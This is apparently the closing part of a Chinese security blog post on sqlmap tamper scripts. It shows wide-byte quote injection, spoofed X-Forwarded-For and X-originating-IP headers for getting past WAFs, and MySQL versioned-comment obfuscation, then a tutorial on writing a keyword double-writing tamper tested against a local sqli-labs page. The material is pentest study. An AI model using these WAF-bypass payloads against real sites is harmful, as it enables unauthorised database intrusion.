&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        found = False</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if payload[i] == &#x27;\&#x27;&#x27; and not found:</span><br><span class="line">                retVal += &quot;%bf%27&quot;</span><br><span class="line">                found = True</span><br><span class="line">            else:</span><br><span class="line">                retVal += payload[i]</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">        if found:</span><br><span class="line">            _ = re.sub(r&quot;(?i)\s*(AND|OR)[\s(]+([^\s]+)\s*(=|LIKE)\s*\2&quot;, &quot;&quot;, retVal)</span><br><span class="line">            if _ != retVal:</span><br><span class="line">                retVal = _</span><br><span class="line">                retVal += &quot;-- &quot;</span><br><span class="line">            elif not any(_ in retVal for _ in (&#x27;#&#x27;, &#x27;--&#x27;, &#x27;/*&#x27;)):</span><br><span class="line">                retVal += &quot;-- &quot;</span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>

<p>38.varnish  主要是用于X-originating-IP可以绕过部分认证</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Append a HTTP header &#x27;X-originating-IP&#x27; to bypass</span><br><span class="line">    WAF Protection of Varnish Firewall</span><br><span class="line">    Notes:</span><br><span class="line">        Reference: http://h30499.www3.hp.com/t5/Fortify-Application-Security/Bypassing-web-application-firewalls-using-HTTP-headers/ba-p/6418366</span><br><span class="line">        Examples:</span><br><span class="line">        &gt;&gt; X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)</span><br><span class="line">        &gt;&gt; X-remote-IP: TARGET_PROXY_IP (184.189.250.X)</span><br><span class="line">        &gt;&gt; X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)</span><br><span class="line">        &gt;&gt; x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)</span><br><span class="line">        &gt;&gt; X-remote-IP: * or %00 or %0A</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)</span><br><span class="line">    headers[&quot;X-originating-IP&quot;] = &quot;127.0.0.1&quot;</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure>

<p>39.versionedmorekeywords  该插件主要是在mysql敏感词两旁加&#x2F;<em>!%s</em>&#x2F;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tamper(&#x27;1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#&#x27;)</span><br><span class="line">    &#x27;1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#&#x27;</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    def process(match):</span><br><span class="line">        word = match.group(&#x27;word&#x27;)</span><br><span class="line">        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:</span><br><span class="line">            return match.group().replace(word, &quot;/*!%s*/&quot; % word)</span><br><span class="line">        else:</span><br><span class="line">            return match.group()</span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = re.sub(r&quot;(?&lt;=\W)(?P&lt;word&gt;[A-Za-z_]+)(?=\W|\Z)&quot;, lambda match: process(match), retVal)</span><br><span class="line">        retVal = retVal.replace(&quot; /*!&quot;, &quot;/*!&quot;).replace(&quot;*/ &quot;, &quot;*/&quot;)</span><br></pre></td></tr></table></figure>

<p>xforwardedfor.py 该插件主要用于随机xforwardedfor</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def randomIP():</span><br><span class="line">    numbers = []</span><br><span class="line">    while not numbers or numbers[0] in (10, 172, 192):</span><br><span class="line">        numbers = sample(xrange(1, 255), 4)</span><br><span class="line">    return &#x27;.&#x27;.join(str(_) for _ in numbers)</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Append a fake HTTP header &#x27;X-Forwarded-For&#x27; to bypass</span><br><span class="line">    WAF (usually application based) protection</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)</span><br><span class="line">    headers[&quot;X-Forwarded-For&quot;] = randomIP()</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure>

<hr>
<p><em><a target="_blank" rel="noopener" href="http://0cx.cc/sqlmap_tamper.jspx">http://0cx.cc/sqlmap_tamper.jspx</a>)</em></p>
<h1 id="sqlmap-脚本编写学习"><a href="#sqlmap-脚本编写学习" class="headerlink" title="sqlmap 脚本编写学习"></a>sqlmap 脚本编写学习</h1><p><a target="_blank" rel="noopener" href="https://y4er.com/posts/sqlmap-tamper/">Sqlmap Tamper 编写 - Y4er的博客</a></p>
<p>sqlmap的<code>--tamper</code>参数可以引入用户自定义的脚本来修改注入时的payload，由此可以使用tamper来绕过waf，替换被过滤的关键字等。这是一个基本的tamper结构</p>
<table>
<thead>
<tr>
<th><code>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15</code></th>
<th><code>#!/usr/bin/env python &quot;&quot;&quot; Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/) See the file &#39;doc/COPYING&#39; for copying permission &quot;&quot;&quot; from lib.core.enums import PRIORITY __priority__ = PRIORITY.LOW # 当前脚本调用优先等级 def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。    pass def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数    return payload </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>需要把他保存为 <code>my.py</code> 放入 <code>sqlmap\tamper</code> 路径下，然后使用的时候加上参数 <code>--tamper=my</code> 就行了</p>
<h2 id="2-简单分析"><a href="#2-简单分析" class="headerlink" title="2 简单分析"></a>2 简单分析</h2><p>拿官方的一个tamper来分析下结构</p>
<table>
<thead>
<tr>
<th><code>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35</code></th>
<th><code>#!/usr/bin/env python &quot;&quot;&quot; Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/) See the file &#39;LICENSE&#39; for copying permission &quot;&quot;&quot; import random from lib.core.compat import xrange from lib.core.enums import PRIORITY __priority__ = PRIORITY.NORMAL def dependencies():    pass def randomIP():    numbers = []     while not numbers or numbers[0] in (10, 172, 192):        numbers = random.sample(xrange(1, 255), 4)     return &#39;.&#39;.join(str(_) for _ in numbers) def tamper(payload, **kwargs):    &quot;&quot;&quot;    Append a fake HTTP header &#39;X-Forwarded-For&#39;    &quot;&quot;&quot;     headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)    headers[&quot;X-Forwarded-For&quot;] = randomIP()    headers[&quot;X-Client-Ip&quot;] = randomIP()    headers[&quot;X-Real-Ip&quot;] = randomIP()    return payload </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>分为了import部分、<code>__priority__</code> 属性、dependencies函数、tamper函数以及用户自定义的函数</p>
<h2 id="3-import"><a href="#3-import" class="headerlink" title="3 import"></a>3 import</h2><p>这一部分我们可以导入sqlmap的内部库，sqlmap为我们提供了很多封装好的函数和数据类型，比如下文的<code>PRIORITY</code>就来源于<code>sqlmap/lib/core/enums.py</code></p>
<h3 id="3-1-PRIORITY"><a href="#3-1-PRIORITY" class="headerlink" title="3.1 PRIORITY"></a>3.1 PRIORITY</h3><p>PRIORITY是定义tamper的优先级，PRIORITY有以下几个参数:</p>
<ul>
<li>LOWEST &#x3D; -100</li>
<li>LOWER &#x3D; -50</li>
<li>LOW &#x3D; -10</li>
<li>NORMAL &#x3D; 0</li>
<li>HIGH &#x3D; 10</li>
<li>HIGHER &#x3D; 50</li>
<li>HIGHEST &#x3D; 100</li>
</ul>
<p>如果使用者使用了多个tamper，sqlmap就会根据每个tamper定义PRIORITY的参数等级来优先使用等级较高的tamper，如果你有两个tamper需要同时用，需要注意这个问题。</p>
<h2 id="4-dependencies"><a href="#4-dependencies" class="headerlink" title="4 dependencies"></a>4 dependencies</h2><p>dependencies主要是提示用户，这个tamper支持哪些数据库，具体代码如下:</p>
<table>
<thead>
<tr>
<th><code>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18</code></th>
<th><code>#!/usr/bin/env python &quot;&quot;&quot; Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/) See the file &#39;LICENSE&#39; for copying permission &quot;&quot;&quot; from lib.core.enums import PRIORITY from lib.core.common import singleTimeWarnMessage from lib.core.enums import DBMS __priority__ = PRIORITY.NORMAL def dependencies():    singleTimeWarnMessage(&quot;这是我的tamper提示&quot;) def tamper(payload, **kwargs):    return payload </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><a target="_blank" rel="noopener" href="https://y4er.com/img/uploads/20191118212606.png"><img src="https://y4er.com/img/uploads/20191118212606.png" alt="20191118212606"></a></p>
<p>DBMS.MYSQL这个参数代表的是Mysql，其他数据库的参数也可以看这个<code>\sqlmap\lib\core\enums.py</code></p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/img/uploads/20191118212624.png"><img src="https://y4er.com/img/uploads/20191118212624.png" alt="20191118212624"></a></p>
<h2 id="5-Tamper"><a href="#5-Tamper" class="headerlink" title="5 Tamper"></a>5 Tamper</h2><p>tamper这个函数是tamper最重要的函数，你要实现的功能，全部写在这个函数里。payload这个参数就是sqlmap的原始注入payload，我们要实现绕过，一般就是针对这个payload的修改。kwargs是针对http头部的修改，如果你bypass，是通过修改http头，就需要用到这个</p>
<h3 id="5-1-基于payload"><a href="#5-1-基于payload" class="headerlink" title="5.1 基于payload"></a>5.1 基于payload</h3><p>先来基于修改payload来绕过替换关键字，我使用sqlilab的第一关，并且修改了部分代码来把恶意关键字替换为空来避免联合查询，如图</p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/img/uploads/20191118212641.png"><img src="https://y4er.com/img/uploads/20191118212641.png" alt="20191118212641"></a></p>
<p>编写tamper来双写绕过</p>
<table>
<thead>
<tr>
<th><code>1 2 3 4 5 </code></th>
<th><code>def tamper(payload, **kwargs):    payload = payload.lower()    payload = payload.replace(&#39;select&#39;,&#39;seleselectct&#39;)    payload = payload.replace(&#39;union&#39;,&#39;ununionion&#39;)    return payload </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>没有使用tamper之前，我们加上<code>--tech=U</code>来让sqlmap只测试联合查询注入，<code>--flush-session</code>意思是每次刷新会话，清理上次的缓存。</p>
<table>
<thead>
<tr>
<th><code>1 </code></th>
<th><code>sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --dbms=mysql </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><a target="_blank" rel="noopener" href="https://y4er.com/img/uploads/20191118212702.png"><img src="https://y4er.com/img/uploads/20191118212702.png" alt="20191118212702"></a></p>
<p>从burp的流量中看到payload是没有双写的，必然会注入失败。而使用了tamper之后</p>
<table>
<thead>
<tr>
<th><code>1 </code></th>
<th><code>sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --tamper=my --dbms=mysql </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><a target="_blank" rel="noopener" href="https://y4er.com/img/uploads/20191118212747.png"><img src="https://y4er.com/img/uploads/20191118212747.png" alt="20191118212747"></a></p>
<p>payload正常双写，可以注入</p>
<p><a target="_blank" rel="noopener" href="https://y4er.com/img/uploads/20191118212800.png"><img src="https://y4er.com/img/uploads/20191118212800.png" alt="20191118212800"></a></p>
<h3 id="5-2-基于http头"><a href="#5-2-基于http头" class="headerlink" title="5.2 基于http头"></a>5.2 基于http头</h3><p>我们使用<code>sqlmap\tamper\xforwardedfor.py</code>的tamper来讲解</p>
<table>
<thead>
<tr>
<th><code>1 2 3 4 5 6 7 8 9 10</code></th>
<th><code>def tamper(payload, **kwargs):    &quot;&quot;&quot;    Append a fake HTTP header &#39;X-Forwarded-For&#39;    &quot;&quot;&quot;     headers = kwargs.get(&quot;headers&quot;, &#123;&#125;)    headers[&quot;X-Forwarded-For&quot;] = randomIP()    headers[&quot;X-Client-Ip&quot;] = randomIP()    headers[&quot;X-Real-Ip&quot;] = randomIP()    return payload </code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>从<code>kwargs</code>中取出<code>headers</code>数组，然后修改了xff值达到随机IP的效果，不再赘述。</p>

    </div>

    
    
    
        <div class="reward-container">
  <div>三天饿九顿，讨点饭吃。</div>
  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
    打赏
  </button>
  <div id="qr" style="display: none;">
      
      <div style="display: inline-block;">
        <img src="https://s3.bmp.ovh/imgs/2024/03/14/21b16ab18c2680bb.png" alt="小zhou 微信支付">
        <p>微信支付</p>
      </div>
      
      <div style="display: inline-block;">
        <img src="https://s3.bmp.ovh/imgs/2024/03/14/d41c13eba802dd0b.png" alt="小zhou 支付宝">
        <p>支付宝</p>
      </div>

  </div>
</div>


      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/04/01/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" rel="prev" title="webshell流量分析">
      <i class="fa fa-chevron-left"></i> webshell流量分析
    </a></div>
      <div class="post-nav-item">
    <a href="/2024/04/03/php%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="next" title="php代码审计">
      php代码审计 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap-%E6%8C%87%E4%BB%A4"><span class="nav-number">1.</span> <span class="nav-text">sqlmap 指令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4"><span class="nav-number">2.</span> <span class="nav-text">常用指令</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap-%E8%84%9A%E6%9C%AC%E8%AF%A6%E8%A7%A3"><span class="nav-number">3.</span> <span class="nav-text">sqlmap 脚本详解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0eunion"><span class="nav-number">3.1.</span> <span class="nav-text">0eunion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apostrophemask"><span class="nav-number">3.2.</span> <span class="nav-text">apostrophemask</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#apostrophenullencode"><span class="nav-number">3.3.</span> <span class="nav-text">apostrophenullencode</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#sqlmap-%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0"><span class="nav-number">4.</span> <span class="nav-text">sqlmap 脚本编写学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90"><span class="nav-number">4.1.</span> <span class="nav-text">2 简单分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-import"><span class="nav-number">4.2.</span> <span class="nav-text">3 import</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-PRIORITY"><span class="nav-number">4.2.1.</span> <span class="nav-text">3.1 PRIORITY</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-dependencies"><span class="nav-number">4.3.</span> <span class="nav-text">4 dependencies</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-Tamper"><span class="nav-number">4.4.</span> <span class="nav-text">5 Tamper</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-%E5%9F%BA%E4%BA%8Epayload"><span class="nav-number">4.4.1.</span> <span class="nav-text">5.1 基于payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-%E5%9F%BA%E4%BA%8Ehttp%E5%A4%B4"><span class="nav-number">4.4.2.</span> <span class="nav-text">5.2 基于http头</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="小zhou"
      src="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
  <p class="site-author-name" itemprop="name">小zhou</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">13</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">小zhou</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">30k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">1:48</span>
</div>

<!--
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div> -->
<!-- <br /> -->
<!-- 网站运行时间的设置 -->
<span id="timeDate">载入天数...</span>
<!-- <span id="times">载入时分秒...</span> -->
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("11/17/2022 8:00:00");//此处修改你的建站时间或者网站上线时间
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); 
        if(String(snum).length ==1 ){snum = "0" + snum;}
        // var times = document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "+hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
    }
setInterval("createtime()",250);
</script>


        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
<script type="text/javascript" src="/js/clicklove.js"></script>
